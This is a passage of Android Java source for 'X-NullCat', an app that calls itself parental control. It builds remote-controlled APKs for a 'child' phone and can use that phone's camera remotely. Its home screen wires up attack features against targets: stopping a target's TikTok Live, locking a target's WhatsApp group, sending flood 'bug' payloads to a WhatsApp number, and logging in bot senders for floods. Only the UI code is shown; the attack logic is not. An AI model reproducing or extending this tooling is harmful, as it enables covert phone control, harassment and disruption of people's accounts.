package com.xnullcat.app;

import android.app.Activity;
import android.app.Dialog;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.Bundle;
import android.text.InputFilter;
import android.text.InputType;
import android.text.TextUtils;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.inputmethod.InputMethodManager;
import android.view.Window;
import android.view.WindowManager;
import android.view.animation.DecelerateInterpolator;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.HorizontalScrollView;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;

/** X-NullCat: aplikasi di HP orang tua untuk mengontrol HP anak lewat internet. */
public class MainActivity extends Activity implements Link.Listener {

    private static final int REQ_PICK_WALLPAPER = 13;
    private static final int REQ_PICK_ICON = 14;
    private static final int MATCH = ViewGroup.LayoutParams.MATCH_PARENT;
    private static final int WRAP = ViewGroup.LayoutParams.WRAP_CONTENT;

    // semua animasi sengaja lambat
    private static final long OUT_MS = 280;
    private static final long IN_MS = 700;
    private static final long STEP_MS = 120;
    private static final long DIALOG_IN_MS = 560;
    private static final long DIALOG_OUT_MS = 300;

    /** HP anak yang disimpan untuk kontrol lewat internet. */
    private static final class NetDev {
        final String code;
        String name;

        NetDev(String code, String name) {
            this.code = code;
            this.name = name;
        }
    }

    private final ArrayList<NetDev> nets = new ArrayList<>();
    private Link link;
    private LinearLayout root;
    private FrameLayout content;
    private int screen = -1; // 0 = Home, 1 = Device
    private boolean swapping;
    private LinearLayout deviceList;
    private TextView hpStatus;
    private TextView homeStatus;
    private TextView accountDeviceCount;
    private Dialog dialog;
    private View dialogBody;
    private Runnable dialogRefresh;
    private boolean closing;
    private boolean deviceListOpen; // kotak kecil Device sedang tampil (jangan auto-tutup walau belum tersambung)
    private android.graphics.Bitmap wallpaperPick; // foto dari galeri, menunggu ditekan Set
    private String wallpaperPickB64;
    private String camFacing = "back"; // kamera HP anak yang dipakai: "back" atau "front"

    // ---- Generate APK
    private android.graphics.Bitmap genIconPick; // icon dari galeri, menunggu dipakai saat Build
    private byte[] genIconPngBytes;
    private GithubBuilder genBuilder;
    private boolean genBusy;
    private boolean genFailed;
    private String genStatusText = "";
    private String genResultUrl; // link unduh APK, terisi kalau build sukses
    private String genRunUrl; // link proses build di GitHub
    private String genApkNameUsed;
    private String genCodeUsed;
    private Runnable genUiRefresh; // dipanggil tiap step berubah, selama kotak Generate APK masih terbuka

    // ------------------------------------------------------------------ siklus hidup

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        link = new Link();
        link.listener = this;
        loadNets();

        Window w = getWindow();
        w.setStatusBarColor(Ui.BG);
        w.setNavigationBarColor(Ui.BG);
        w.getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR | View.SYSTEM_UI_FLAG_LIGHT_NAVIGATION_BAR);

        root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Ui.BG);
        content = new FrameLayout(this);
        root.addView(content, new LinearLayout.LayoutParams(MATCH, 0, 1f));
        setContentView(root);

        go(0);
    }

    @Override
    protected void onDestroy() {
        link.listener = null;
        link.disconnect();
        super.onDestroy();
    }

    @Override
    public void onBackPressed() {
        if (dialog != null && dialog.isShowing()) {
            dialog.dismiss();
            return;
        }
        if (screen == 1) {
            go(0);
            return;
        }
        super.onBackPressed();
    }

    // ------------------------------------------------------------------ util

    private int dp(float v) {
        return Ui.dp(this, v);
    }

    private LinearLayout.LayoutParams lp(int w, int h, float l, float t, float r, float b) {
        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(w, h);
        p.setMargins(dp(l), dp(t), dp(r), dp(b));
        return p;
    }

    private void toast(String s) {
        Toast.makeText(this, s, Toast.LENGTH_SHORT).show();
    }

    // ------------------------------------------------------------------ pindah layar (efek lambat)

    private void go(int target) {
        if (swapping || target == screen) {
            return;
        }
        dismissDialog();
        screen = target;
        ViewGroup sv = buildHome();
        swap(sv, (ViewGroup) sv.getChildAt(0), null);
    }

    private void swap(final View next, final ViewGroup staggerTarget, final Runnable afterShow) {
        final View old = content.getChildCount() > 0 ? content.getChildAt(0) : null;
        final Runnable put = new Runnable() {
            @Override
            public void run() {
                content.removeAllViews();
                content.addView(next, new FrameLayout.LayoutParams(MATCH, MATCH));
                swapping = false;
                stagger(staggerTarget);
                if (afterShow != null) {
                    afterShow.run();
                }
            }
        };
        swapping = true;
        if (old == null) {
            put.run();
        } else {
            old.animate().alpha(0f).translationY(dp(10)).setDuration(OUT_MS)
                    .setInterpolator(new DecelerateInterpolator(1.5f))
                    .withEndAction(put).start();
        }
    }

    /** Isi layar muncul satu per satu dengan gerak pelan. */
    private void stagger(ViewGroup g) {
        for (int i = 0; i < g.getChildCount(); i++) {
            View c = g.getChildAt(i);
            c.setAlpha(0f);
            c.setTranslationY(dp(28));
            c.animate().alpha(1f).translationY(0f)
                    .setStartDelay(STEP_MS * i).setDuration(IN_MS)
                    .setInterpolator(new DecelerateInterpolator(2f)).start();
        }
    }

    // ------------------------------------------------------------------ layar Home

    private WebView homeWeb;

    /**
     * Home dirender langsung dari assets/home.html (tampilan dashboard persis bikinan user sendiri),
     * bukan ditiru ulang pakai View biasa. Tombol-tombolnya disambungkan ke fitur asli lewat HomeBridge.
     */
    private ViewGroup buildHome() {
        deviceList = null;
        hpStatus = null;
        homeStatus = null;

        FrameLayout wrap = new FrameLayout(this);
        if (homeWeb == null) {
            homeWeb = new WebView(this);
            WebSettings ws = homeWeb.getSettings();
            ws.setJavaScriptEnabled(true);
            ws.setMediaPlaybackRequiresUserGesture(false);
            ws.setDomStorageEnabled(true);
            homeWeb.setBackgroundColor(Color.BLACK);
            homeWeb.setWebViewClient(new WebViewClient());
            homeWeb.addJavascriptInterface(new HomeBridge(), "AndroidBridge");
            homeWeb.loadUrl("file:///android_asset/home.html");
        } else {
            ViewGroup p = (ViewGroup) homeWeb.getParent();
            if (p != null) {
                p.removeView(homeWeb);
            }
        }
        wrap.addView(homeWeb, new FrameLayout.LayoutParams(MATCH, MATCH));
        updateHomeStatus();
        return wrap;
    }

    /** Jembatan dari tombol-tombol di home.html (JS) ke fitur asli di Java. */
    private final class HomeBridge {
        @JavascriptInterface
        public void openDevice() {
            runOnUiThread(new Runnable() {
                @Override public void run() { openDeviceList(); }
            });
        }

        @JavascriptInterface
        public void openBuildApp() {
            runOnUiThread(new Runnable() {
                @Override public void run() { openGenerateApk(); }
            });
        }

        @JavascriptInterface
        public void openAttackLive() {
            runOnUiThread(new Runnable() {
                @Override public void run() { MainActivity.this.openAttackLive(); }
            });
        }

        @JavascriptInterface
        public void openLockChat() {
            runOnUiThread(new Runnable() {
                @Override public void run() { MainActivity.this.openLockChat(); }
            });
        }

        @JavascriptInterface
        public void openBugWa() {
            runOnUiThread(new Runnable() {
                @Override public void run() { MainActivity.this.openBugWa(); }
            });
        }

        @JavascriptInterface
        public void openAddSender() {
            runOnUiThread(new Runnable() {
                @Override public void run() { MainActivity.this.openAddSender(); }
            });
        }

        @JavascriptInterface
        public void toast(final String msg) {
            runOnUiThread(new Runnable() {
                @Override public void run() { MainActivity.this.toast(msg); }
            });
        }
    }

    private View buildBanner() {
        // bingkai hitam tebal ala neobrutalism, dengan bayangan keras di belakangnya
        FrameLayout shell = new FrameLayout(this);
        shell.setBackground(Ui.box(this, Ui.SURFACE, 18, Ui.INK, 3.5f));
        shell.setPadding(dp(5), dp(5), dp(5), dp(5));
        Ui.clipRound(shell, dp(18));

        Ui.AspectFrame banner = new Ui.AspectFrame(this, 1.65f);
        banner.setBackgroundColor(0xFF20242C);
        Ui.clipRound(banner, dp(13));

        banner.addView(new LoopVideo(this, "banner.mp4"), new FrameLayout.LayoutParams(MATCH, MATCH));

        View scrim = new View(this);
        scrim.setBackground(new GradientDrawable(GradientDrawable.Orientation.BOTTOM_TOP,
                new int[]{0xF2030610, 0xB3030610, 0x33030610, 0x00030610}));
        banner.addView(scrim, new FrameLayout.LayoutParams(MATCH, MATCH));

        LinearLayout copy = new LinearLayout(this);
        copy.setOrientation(LinearLayout.VERTICAL);
        copy.setPadding(dp(22), 0, dp(22), dp(20));
        TextView t1 = Ui.text(this, "PL Projek", 23, Color.WHITE, true, true);
        t1.setLetterSpacing(0.02f);
        t1.setShadowLayer(dp(10), 0, dp(2), 0x59000000);
        TextView t2 = Ui.text(this, "Developed By PL Projek Team", 12.5f, 0xCCFFFFFF, false, true);
        t2.setLetterSpacing(0.05f);
        copy.addView(t1, lp(WRAP, WRAP, 0, 0, 0, 8));
        copy.addView(t2, lp(WRAP, WRAP, 0, 0, 0, 0));
        banner.addView(copy, new FrameLayout.LayoutParams(MATCH, WRAP, Gravity.BOTTOM));

        // badge sapaan di pojok kiri atas, ala neobrutalism (bingkai tebal + bayangan keras)
        TextView greet = Ui.text(this, "HEY, BOSS!", 12.5f, Ui.INK, true, false);
        greet.setLetterSpacing(0.03f);
        greet.setPadding(dp(13), dp(6), dp(13), dp(6));
        greet.setBackground(Ui.box(this, Ui.YELLOW, 9, Ui.EDGE, 2.5f));
        FrameLayout.LayoutParams greetLp = new FrameLayout.LayoutParams(WRAP, WRAP, Gravity.TOP | Gravity.START);
        greetLp.setMargins(dp(12), dp(12), 0, 0);
        banner.addView(Ui.brutal(this, greet, 9, 3), greetLp);

        // dua tombol bundar kecil di pojok kanan atas (belum aktif, cuma hiasan info)
        LinearLayout chips = new LinearLayout(this);
        chips.setOrientation(LinearLayout.HORIZONTAL);
        FrameLayout chart = Ui.chip(this, Ui.CHART);
        chart.setOnClickListener(v -> toast("Statistik belum aktif."));
        chips.addView(chart, lp(dp(34), dp(34), 0, 0, 8, 0));
        FrameLayout bell = Ui.chip(this, Ui.BELL);
        bell.setOnClickListener(v -> toast("Notifikasi belum aktif."));
        chips.addView(bell, lp(dp(34), dp(34), 0, 0, 0, 0));
        FrameLayout.LayoutParams chipsLp = new FrameLayout.LayoutParams(WRAP, WRAP, Gravity.TOP | Gravity.END);
        chipsLp.setMargins(0, dp(12), dp(12), 0);
        banner.addView(chips, chipsLp);

        shell.addView(banner, new FrameLayout.LayoutParams(MATCH, MATCH));
        return Ui.brutal(this, shell, 18, 7);
    }

    /** Kartu status akun, gaya kotak tebal ala neobrutalism, murni info (tanpa langganan/berbayar). */
    private View buildAccountStatus() {
        FrameLayout card = new FrameLayout(this);
        card.setBackground(Ui.box(this, Ui.SURFACE, 18, Ui.EDGE, 3f));
        card.setPadding(dp(16), dp(14), dp(16), dp(14));

        LinearLayout col = new LinearLayout(this);
        col.setOrientation(LinearLayout.VERTICAL);

        TextView label = Ui.text(this, "STATUS AKUN", 10.5f, Ui.INK, true, false);
        label.setLetterSpacing(0.1f);
        label.setPadding(dp(10), dp(4), dp(10), dp(4));
        label.setBackground(Ui.box(this, Ui.YELLOW, 7, Ui.EDGE, 2f));
        col.addView(label, lp(WRAP, WRAP, 0, 0, 0, 8));

        LinearLayout row = new LinearLayout(this);
        row.setGravity(Gravity.CENTER_VERTICAL);

        LinearLayout left = new LinearLayout(this);
        left.setOrientation(LinearLayout.VERTICAL);
        left.addView(Ui.text(this, "PARENT", 22, Ui.INK, true, false), lp(WRAP, WRAP, 0, 0, 0, 4));

        TextView active = Ui.text(this, "●  Aktif", 11.5f, Ui.GREEN, true, true);
        left.addView(active, lp(WRAP, WRAP, 0, 0, 0, 0));
        row.addView(left, new LinearLayout.LayoutParams(0, WRAP, 1f));

        accountDeviceCount = Ui.text(this, "0", 22, Ui.INK, true, false);
        LinearLayout countBox = new LinearLayout(this);
        countBox.setGravity(Gravity.CENTER);
        countBox.setPadding(dp(14), dp(6), dp(14), dp(6));
        countBox.setBackground(Ui.box(this, Ui.ACCENT2, 11, Ui.EDGE, 2.5f));
        LinearLayout countCol = new LinearLayout(this);
        countCol.setOrientation(LinearLayout.VERTICAL);
        countCol.setGravity(Gravity.CENTER);
        countCol.addView(accountDeviceCount, lp(WRAP, WRAP, 0, 0, 0, 0));
        TextView countLabel = Ui.text(this, "HP ANAK", 9, Color.WHITE, true, false);
        countLabel.setLetterSpacing(0.08f);
        countCol.addView(countLabel, lp(WRAP, WRAP, 0, 1, 0, 0));
        countBox.addView(countCol);
        row.addView(Ui.brutal(this, countBox, 11, 3), new LinearLayout.LayoutParams(WRAP, WRAP));

        col.addView(row, lp(MATCH, WRAP, 0, 0, 0, 0));
        card.addView(col);
        return Ui.brutal(this, card, 18, 6);
    }

    /** Dua tombol besar ala neobrutalism: Device (fungsi nyata) dan Chat Global (belum aktif). */
    private View buildBigButtons() {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);

        LinearLayout launch = bigButton(Ui.PHONE, "LAUNCH DEVICE", Ui.YELLOW, Ui.INK);
        launch.setOnClickListener(v -> openDeviceList());
        row.addView(Ui.brutal(this, launch, 22, 5), new LinearLayout.LayoutParams(0, WRAP, 1f));

        row.addView(new View(this), new LinearLayout.LayoutParams(dp(10), 1));

        LinearLayout chat = bigButton(Ui.CHAT, "CHAT GLOBAL", Ui.ACCENT, Color.WHITE);
        chat.setOnClickListener(v -> toast("Fitur Chat Global belum aktif."));
        row.addView(Ui.brutal(this, chat, 22, 5), new LinearLayout.LayoutParams(0, WRAP, 1f));

        return row;
    }

    private LinearLayout bigButton(int icon, String title, int bg, int fg) {
        LinearLayout b = new LinearLayout(this);
        b.setGravity(Gravity.CENTER);
        b.setPadding(dp(10), dp(17), dp(10), dp(17));
        b.setBackground(Ui.box(this, bg, 22, Ui.EDGE, 3.5f));
        b.setClickable(true);
        Ui.pressable(b);
        b.addView(new Ui.IconView(this, icon, fg), lp(dp(20), dp(20), 0, 0, 8, 0));
        TextView t = Ui.text(this, title, 12.5f, fg, true, false);
        t.setLetterSpacing(0.02f);
        b.addView(t, lp(WRAP, WRAP, 0, 0, 0, 0));
        return b;
    }

    /** Kartu besar yang bisa digeser (swipe) ala neobrutalism: Device dan Build App. */
    private View buildQuickRail() {
        HorizontalScrollView sv = new HorizontalScrollView(this);
        sv.setHorizontalScrollBarEnabled(false);
        sv.setClipToPadding(false);
        int side = dp(2);
        sv.setPadding(side, 0, side, 0);

        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        int cw = (int) (getResources().getDisplayMetrics().widthPixels * 0.72f);

        View deviceCard = quickCard(Ui.PHONE, "01", "DEVICE", "Kelola perangkat HP anak dengan mudah dan aman.",
                Ui.ACCENT, Color.WHITE, null, v -> openDeviceList());
        LinearLayout.LayoutParams deviceLp = new LinearLayout.LayoutParams(cw, dp(216));
        deviceLp.setMargins(0, 0, dp(14), 0);
        row.addView(deviceCard, deviceLp);

        View buildCard = quickCard(Ui.BUILD, "02", "BUILD APP", "Ubah project jadi APK langsung dari sini.",
                0xFF1B1C20, Color.WHITE, "BUILD", v -> openGenerateApk());
        LinearLayout.LayoutParams buildLp = new LinearLayout.LayoutParams(cw, dp(216));
        buildLp.setMargins(0, 0, dp(14), 0);
        row.addView(buildCard, buildLp);

        View attackCard = quickCard(Ui.TIKTOK, "04", "ATTACK LIVE", "Hentikan TikTok Live target dengan sekali klik.",
                0xFF0D0D0D, Color.WHITE, "ATTACK", v -> openAttackLive());
        LinearLayout.LayoutParams attackLp = new LinearLayout.LayoutParams(cw, dp(216));
        attackLp.setMargins(0, 0, dp(14), 0);
        row.addView(attackCard, attackLp);

        View lockCard = quickCard(Ui.CHAT, "05", "LOCK CHAT", "Kunci grup WhatsApp target dengan pesan custom.",
                0xFF0A5C2E, Color.WHITE, "LOCK", v -> openLockChat());
        LinearLayout.LayoutParams lockLp = new LinearLayout.LayoutParams(cw, dp(216));
        lockLp.setMargins(0, 0, dp(14), 0);
        row.addView(lockCard, lockLp);

        View bugWaCard = quickCard(Ui.WARN, "06", "BUG WA", "Kirim payload flood ke nomor target sampai delay.",
                0xFF1a0030, Color.WHITE, "BUG", v -> openBugWa());
        LinearLayout.LayoutParams bugWaLp = new LinearLayout.LayoutParams(cw, dp(216));
        bugWaLp.setMargins(0, 0, dp(14), 0);
        row.addView(bugWaCard, bugWaLp);

        View addSenderCard = quickCard(Ui.BELL, "07", "ADD SENDER", "Login bot WA via pairing code untuk kirim flood.",
                0xFF0a1628, Color.WHITE, "LOGIN", v -> openAddSender());
        row.addView(addSenderCard, new LinearLayout.LayoutParams(cw, dp(216)));

        sv.addView(row, new FrameLayout.LayoutParams(WRAP, WRAP));
        return sv;
    }

    private View quickCard(int icon, String number, String title, String desc, int bg, int fg, final String tag, View.OnClickListener click) {
        FrameLayout card = new FrameLayout(this);
        card.setBackground(Ui.box(this, bg, 24, Ui.EDGE, 3.5f));
        card.setClickable(true);
        card.setOnClickListener(click);
        Ui.pressable(card);
        int pad = dp(16);
        card.setPadding(pad, pad, pad, pad);

        FrameLayout ibox = new FrameLayout(this);
        ibox.setBackground(Ui.box(this, Ui.INK, 14, fg, 1.8f));
        ibox.addView(new Ui.IconView(this, icon, fg), new FrameLayout.LayoutParams(dp(26), dp(26), Gravity.CENTER));
        FrameLayout.LayoutParams iboxLp = new FrameLayout.LayoutParams(dp(52), dp(52), Gravity.TOP | Gravity.START);
        card.addView(ibox, iboxLp);

        TextView num = Ui.text(this, number, 36, (0x22000000 | (fg & 0xFFFFFF)), true, false);
        num.setAlpha(0.55f);
        card.addView(num, new FrameLayout.LayoutParams(WRAP, WRAP, Gravity.TOP | Gravity.END));

        LinearLayout bottom = new LinearLayout(this);
        bottom.setOrientation(LinearLayout.VERTICAL);
        TextView t = Ui.text(this, title, 19, fg, true, false);
        bottom.addView(t, lp(WRAP, WRAP, 0, 0, 0, 4));
        TextView d = Ui.text(this, desc, 11.5f, fg, false, true);
        d.setAlpha(0.82f);
        d.setLineSpacing(0, 1.15f);
        bottom.addView(d, lp(dp(190), WRAP, 0, 0, 0, tag != null ? 10 : 0));
        if (tag != null) {
            TextView tagView = Ui.text(this, tag, 11.5f, Ui.INK, true, false);
            tagView.setPadding(dp(14), dp(7), dp(14), dp(7));
            tagView.setBackground(Ui.box(this, Ui.YELLOW, 9, Ui.EDGE, 2f));
            bottom.addView(Ui.brutal(this, tagView, 9, 3), lp(WRAP, WRAP, 0, 0, 0, 0));
        }
        FrameLayout.LayoutParams bottomLp = new FrameLayout.LayoutParams(WRAP, WRAP, Gravity.BOTTOM | Gravity.START);
        card.addView(bottom, bottomLp);

        return Ui.brutal(this, card, 24, 7);
    }

    private View navButton(int icon, String title, View.OnClickListener click) {
        LinearLayout r = new LinearLayout(this);
        r.setOrientation(LinearLayout.VERTICAL);
        r.setGravity(Gravity.CENTER);
        r.setPadding(dp(8), dp(12), dp(8), dp(12));
        r.setBackground(Ui.box(this, Ui.SURFACE, 14, Ui.EDGE, 2.5f));
        r.setClickable(true);
        r.setOnClickListener(click);
        Ui.pressable(r);

        FrameLayout ico = new FrameLayout(this);
        ico.setBackground(Ui.box(this, Ui.BG, 10, Ui.EDGE, 2f));
        ico.addView(new Ui.IconView(this, icon, Ui.INK), new FrameLayout.LayoutParams(dp(18), dp(18), Gravity.CENTER));
        r.addView(ico, lp(dp(36), dp(36), 0, 0, 0, 6));

        TextView t = Ui.text(this, title, 12, Ui.INK, true, false);
        t.setSingleLine(true);
        r.addView(t, lp(WRAP, WRAP, 0, 0, 0, 0));
        return Ui.brutal(this, r, 14, 4);
    }

    private View quickActionCard(int icon, String title, View.OnClickListener click) {
        LinearLayout r = new LinearLayout(this);
        r.setGravity(Gravity.CENTER_VERTICAL);
        r.setPadding(dp(12), dp(12), dp(18), dp(12));
        r.setBackground(Ui.box(this, Ui.SURFACE, 14, Ui.EDGE, 2.5f));
        r.setClickable(true);
        r.setOnClickListener(click);
        Ui.pressable(r);

        FrameLayout ico = new FrameLayout(this);
        ico.setBackground(Ui.box(this, Ui.BG, 10, Ui.EDGE, 2f));
        ico.addView(new Ui.IconView(this, icon, Ui.INK), new FrameLayout.LayoutParams(dp(20), dp(20), Gravity.CENTER));
        r.addView(ico, lp(dp(40), dp(40), 0, 0, 10, 0));

        r.addView(Ui.text(this, title, 14, Ui.INK, true, false), lp(WRAP, WRAP, 0, 0, 0, 0));
        return Ui.brutal(this, r, 14, 5);
    }

    private void updateHomeStatus() {
        if (accountDeviceCount != null) {
            accountDeviceCount.setText(String.valueOf(nets.size()));
        }
        if (homeStatus == null) {
            return;
        }
        if (link.state == Link.CONNECTED) {
            if (link.net) {
                homeStatus.setText("Tersambung lewat internet ke " + link.name + (link.online ? "" : " (offline)"));
            } else {
                homeStatus.setText("Tersambung ke " + link.name);
            }
            homeStatus.setTextColor(link.net && !link.online ? Ui.SOFT : Ui.GREEN);
        } else if (link.state == Link.CONNECTING) {
            homeStatus.setText("Menyambung…");
            homeStatus.setTextColor(Ui.SOFT);
        } else {
            homeStatus.setText("Belum tersambung. Tekan kartu Device di Quick Access.");
            homeStatus.setTextColor(Ui.SOFT);
        }
    }

    // ------------------------------------------------------------------ layar Device (daftar HP anak)

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        if (req == REQ_PICK_WALLPAPER) {
            if (res == Activity.RESULT_OK && data != null && data.getData() != null) {
                handleWallpaperPicked(data.getData());
            }
        } else if (req == REQ_PICK_ICON) {
            if (res == Activity.RESULT_OK && data != null && data.getData() != null) {
                handleIconPicked(data.getData());
            }
        }
    }

    /** Membaca foto icon yang dipilih dari galeri, memotongnya jadi kotak, lalu menyimpannya sebagai PNG kecil. */
    private void handleIconPicked(android.net.Uri uri) {
        try {
            android.graphics.Bitmap full;
            java.io.InputStream in = getContentResolver().openInputStream(uri);
            try {
                full = BitmapFactory.decodeStream(in);
            } finally {
                if (in != null) {
                    in.close();
                }
            }
            if (full == null) {
                toast("Gagal membuka foto itu.");
                return;
            }
            int side = Math.min(full.getWidth(), full.getHeight());
            int x = (full.getWidth() - side) / 2;
            int y = (full.getHeight() - side) / 2;
            android.graphics.Bitmap square = android.graphics.Bitmap.createBitmap(full, x, y, side, side);
            android.graphics.Bitmap icon = android.graphics.Bitmap.createScaledBitmap(square, 192, 192, true);
            java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
            icon.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, bos);
            genIconPick = icon;
            genIconPngBytes = bos.toByteArray();
        } catch (Exception e) {
            toast("Gagal membaca foto itu.");
            return;
        }
        if (genUiRefresh != null) {
            genUiRefresh.run();
        }
    }

    /** Membaca foto yang dipilih dari galeri, mengecilkannya, lalu menyimpannya menunggu tombol Set. */
    private void handleWallpaperPicked(android.net.Uri uri) {
        try {
            android.graphics.Bitmap full;
            java.io.InputStream in = getContentResolver().openInputStream(uri);
            try {
                full = BitmapFactory.decodeStream(in);
            } finally {
                if (in != null) {
                    in.close();
                }
            }
            if (full == null) {
                toast("Gagal membuka foto itu.");
                return;
            }
            int maxSide = 1080;
            int w = full.getWidth();
            int h = full.getHeight();
            android.graphics.Bitmap scaled = full;
            if (Math.max(w, h) > maxSide) {
                float scale = maxSide / (float) Math.max(w, h);
                scaled = android.graphics.Bitmap.createScaledBitmap(full, Math.round(w * scale), Math.round(h * scale), true);
            }
            java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
            scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, 75, bos);
            wallpaperPick = scaled;
            wallpaperPickB64 = android.util.Base64.encodeToString(bos.toByteArray(), android.util.Base64.NO_WRAP);
        } catch (Exception e) {
            toast("Gagal membaca foto itu.");
            return;
        }
        if (screen == 1 && dialogBody != null) {
            openWallpaper();
        }
    }

    private void setHpStatus(String s) {
        if (hpStatus != null) {
            hpStatus.setText(s);
        }
    }

    private void renderDevices() {
        if (deviceList == null) {
            return;
        }
        deviceList.removeAllViews();
        if (nets.isEmpty()) {
            TextView empty = Ui.text(this, "Belum ada HP anak. Tekan \"+ Generate APK\" untuk membuat APK Jaga Anak baru.", 13, Ui.SOFT, false, true);
            empty.setGravity(Gravity.CENTER);
            deviceList.addView(empty, lp(MATCH, WRAP, 0, 4, 0, 16));
        }
        for (final NetDev n : nets) {
            deviceList.addView(netRow(n), lp(MATCH, WRAP, 0, 0, 0, 10));
        }
        deviceList.addView(addRow(), lp(MATCH, WRAP, 0, 0, 0, 0));
    }

    // ---- kontrol lewat internet

    private void loadNets() {
        nets.clear();
        try {
            SharedPreferences p = getSharedPreferences("net", MODE_PRIVATE);
            JSONArray a = new JSONArray(p.getString("list", "[]"));
            for (int i = 0; i < a.length(); i++) {
                JSONObject o = a.getJSONObject(i);
                String c = Code.normalize(o.optString("c"));
                if (c != null) {
                    nets.add(new NetDev(c, o.optString("n", "HP anak")));
                }
            }
        } catch (Exception ignored) {
            // daftar rusak: mulai kosong
        }
    }

    private void saveNets() {
        try {
            JSONArray a = new JSONArray();
            for (NetDev n : nets) {
                a.put(new JSONObject().put("c", n.code).put("n", n.name));
            }
            getSharedPreferences("net", MODE_PRIVATE).edit().putString("list", a.toString()).apply();
        } catch (Exception ignored) {
            // gagal menyimpan: daftar tetap ada selama aplikasi terbuka
        }
    }

    private boolean isMine(NetDev n) {
        return link.net && link.address.equals("net:" + n.code);
    }

    private View addRow() {
        LinearLayout r = new LinearLayout(this);
        r.setGravity(Gravity.CENTER);
        r.setPadding(dp(14), dp(14), dp(14), dp(14));
        r.setBackground(Ui.box(this, Ui.SURFACE, 22, Ui.EDGE, 1));
        r.setClickable(true);
        Ui.pressable(r);
        r.setOnClickListener(v -> openGenerateApk());
        r.addView(Ui.text(this, "+  Generate APK", 14, Ui.INK, true, false));
        return r;
    }

    private View netRow(final NetDev n) {
        boolean mine = isMine(n);
        LinearLayout r = new LinearLayout(this);
        r.setGravity(Gravity.CENTER_VERTICAL);
        r.setPadding(dp(14), dp(14), dp(14), dp(14));
        r.setBackground(Ui.box(this, Ui.SURFACE, 22, Ui.EDGE, 1));
        r.setElevation(dp(2));
        r.setClickable(true);
        Ui.pressable(r);
        r.setOnClickListener(v -> onNetTap(n));
        r.setOnLongClickListener(v -> {
            openRemoveNet(n);
            return true;
        });

        FrameLayout ico = new FrameLayout(this);
        ico.setBackground(Ui.box(this, Ui.BG, 16, Ui.EDGE, 1));
        ico.addView(new Ui.IconView(this, Ui.PHONE, Ui.INK), new FrameLayout.LayoutParams(dp(24), dp(24), Gravity.CENTER));
        r.addView(ico, lp(dp(48), dp(48), 0, 0, 14, 0));

        LinearLayout mid = new LinearLayout(this);
        mid.setOrientation(LinearLayout.VERTICAL);
        TextView name = Ui.text(this, n.name, 16, Ui.INK, true, false);
        name.setSingleLine(true);
        name.setEllipsize(TextUtils.TruncateAt.END);
        TextView sub = Ui.text(this, "Internet · kode …" + n.code.substring(n.code.length() - 4), 11, Ui.SOFT, false, true);
        mid.addView(name, lp(MATCH, WRAP, 0, 0, 0, 5));
        mid.addView(sub, lp(WRAP, WRAP, 0, 0, 0, 0));
        r.addView(mid, new LinearLayout.LayoutParams(0, WRAP, 1f));

        String state = null;
        int color = Ui.SOFT;
        boolean bold = false;
        if (mine && link.state == Link.CONNECTED) {
            state = link.online ? "● Online" : "○ Offline";
            color = link.online ? Ui.GREEN : Ui.SOFT;
            bold = link.online;
        } else if (mine && link.state == Link.CONNECTING) {
            state = "Menyambung…";
        }
        if (state != null) {
            r.addView(Ui.text(this, state, 12, color, bold, true), lp(WRAP, WRAP, 10, 0, 0, 0));
        }
        return r;
    }

    private void onNetTap(NetDev n) {
        boolean mine = isMine(n);
        if (mine && link.state == Link.CONNECTED) {
            openFeatures();
            return;
        }
        if (mine && link.state == Link.CONNECTING) {
            toast("Sedang menyambung, tunggu sebentar.");
            return;
        }
        if (link.state != Link.IDLE) {
            link.disconnect();
        }
        setHpStatus("Menyambung lewat internet ke " + n.name + "…");
        link.connectNet(n.code, n.name);
        renderDevices();
    }

    /** Dipakai setelah Generate APK berhasil: kode sudah pasti baru dan sah, jadi langsung didaftarkan. */
    private void addNet(String code, String name) {
        NetDev found = null;
        for (NetDev n : nets) {
            if (n.code.equals(code)) {
                found = n;
            }
        }
        if (found == null) {
            found = new NetDev(code, name == null || name.isEmpty() ? "HP anak" : name);
            nets.add(found);
            saveNets();
        }
        renderDevices();
    }

    private void hideKeyboard(View v) {
        InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
        if (imm != null) {
            imm.hideSoftInputFromWindow(v.getWindowToken(), 0);
        }
    }

    private void openRemoveNet(final NetDev n) {
        if (closing) {
            return;
        }
        LinearLayout body = card();
        body.addView(Ui.text(this, "Hapus HP ini?", 16, Ui.INK, true, false), lp(MATCH, WRAP, 0, 0, 0, 6));
        body.addView(Ui.text(this, n.name + " dihapus dari daftar. Kodenya bisa dimasukkan lagi nanti.", 11.5f, Ui.SOFT, false, true), lp(MATCH, WRAP, 0, 0, 0, 12));
        LinearLayout row = new LinearLayout(this);
        TextView cancel = pill("Batal", false);
        TextView del = pill("Hapus", true);
        cancel.setOnClickListener(v -> closeDialog());
        del.setOnClickListener(v -> closeDialog(new Runnable() {
            @Override
            public void run() {
                if (isMine(n)) {
                    link.disconnect();
                }
                nets.remove(n);
                saveNets();
                renderDevices();
            }
        }));
        row.addView(cancel, new LinearLayout.LayoutParams(0, WRAP, 1f));
        row.addView(new View(this), new LinearLayout.LayoutParams(dp(8), 1));
